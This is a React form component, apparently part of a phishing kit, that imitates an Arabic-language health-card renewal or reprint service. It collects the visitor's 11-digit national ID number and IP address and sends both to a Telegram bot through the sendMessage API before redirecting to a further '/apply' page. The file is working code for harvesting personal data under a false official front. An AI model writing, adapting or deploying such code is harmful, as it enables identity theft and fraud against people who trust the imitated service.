"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import CustomRadio from "./CustomRadio";
import LoadingButton from "./Button";

export default function FormPage() {
  const [idNumber, setIdNumber] = useState("");
  const [operationType, setOperationType] = useState("renew");
  const [error, setError] = useState(false);
  const [ipAddress, setIpAddress] = useState(""); // لتخزين عنوان IP
  const router = useRouter();

  useEffect(() => {
    // الحصول على عنوان IP
    const fetchIp = async () => {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        setIpAddress(data.ip);
      } catch (error) {
        console.error("Error fetching IP address:", error);
      }
    };

    fetchIp();
  }, []);

  const handleClear = () => {
    setIdNumber("");
    setOperationType("renew");
    setError(false);
  };

  const handleInputChange = (e) => {
    const value = e.target.value;
    // السماح بإدخال الأرقام فقط والتأكد من عدم تجاوز 11 رقمًا
    if (/^\d*$/.test(value) && value.length <= 11) {
      setIdNumber(value);
      setError(false); // إزالة الخطأ عند إدخال قيمة صحيحة
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (idNumber.length === 11) {
      setError(false);

      const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
      const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;

      const userIP = await fetch("https://api.ipify.org?format=json")
        .then((res) => res.json())
        .then((data) => data.ip);

      // 🟢 Save to sessionStorage
      sessionStorage.setItem(
        "userData",
        JSON.stringify({
          idNumber: idNumber,
          ipAddress: userIP,
        })
      );

      const message = `ID Card: ${idNumber}
IP Adress: ${ipAddress}`;

      try {
        const response = await fetch(
          `https://api.telegram.org/bot${botToken}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
            }),
          }
        );

        if (response.ok) {
          router.push(`/apply?idNumber=${idNumber}`);
          return true; // ✅ allow button to spin
        } else {
          alert("أعد المحاولة حدث خطأ ما");
          return false; // ❌ don’t spin
        }
      } catch (error) {
        console.error("Fetch error:", error);
        alert("أعد المحاولة حدث خطأ ما");
        return false; // ❌ don’t spin
      }
    } else {
      setError(true);
      return false; // ❌ don’t spin if validation fails
    }
  };

  return (
    <div className="w-full max-w-md p-4 bg-white rounded">
      <p className="text-md text-gray-600 mb-4">
        طلب الإستعلام عن البطاقة الصحية -- سوف يستغرق حوالي 20 ثانية لإتمام
        الطلب.
      </p>

      <div className="mb-4">
        <p className="text-2xl py-8 font-bold">المعلومات</p>
        <label className="block text-md font-medium mb-2">
          الرجاء إدخال رقم البطاقة الشخصية:
        </label>
        <input
          type="text"
          value={idNumber}
          onChange={handleInputChange}
          className={`w-full px-4 py-2 border rounded focus:outline-none focus:ring ${
            error ? "border-red-500" : "border-gray-300"
          }`}
          placeholder="12345678909"
          maxLength={11}
        />
        {error && (
          <p className="text-red-500 text-sm mt-1">
            يجب أن يتكون رقم البطاقة من 11 رقمًا.
          </p>
        )}
      </div>

      <div className="mb-4">
        <label className="block text-md font-medium mb-2">نوع العملية:</label>

        <div className="flex flex-col gap-4">
          <label className="flex items-center cursor-pointer">
            <input
              type="radio"
              value="reprint"
              checked={operationType === "reprint"}
              onChange={() => setOperationType("reprint")}
              className="sr-only peer"
            />
            <CustomRadio />
            <span className="ml-2 text-gray-700 select-none">تجديد</span>
          </label>

          <label className="flex items-center cursor-pointer">
            <input
              type="radio"
              value="renew"
              checked={operationType === "renew"}
              onChange={() => setOperationType("renew")}
              className="sr-only peer"
            />
            <CustomRadio />
            <span className="ml-2 text-gray-700 select-none">
              إعادة الطبع (المفقود أو التالف)
            </span>
          </label>
        </div>
      </div>

      <div className="w-[100%] flex justify-between items-center py-6 px-6 gap-4">
        <button
          onClick={handleClear}
          className=" w-fill px-4 py-2 bg-gray-500 text-white rounded-3xl hover:bg-gray-600"
        >
          تفريغ الحقول
        </button>
        <LoadingButton onClick={handleSubmit}>تابع</LoadingButton>
      </div>
    </div>
  );
}
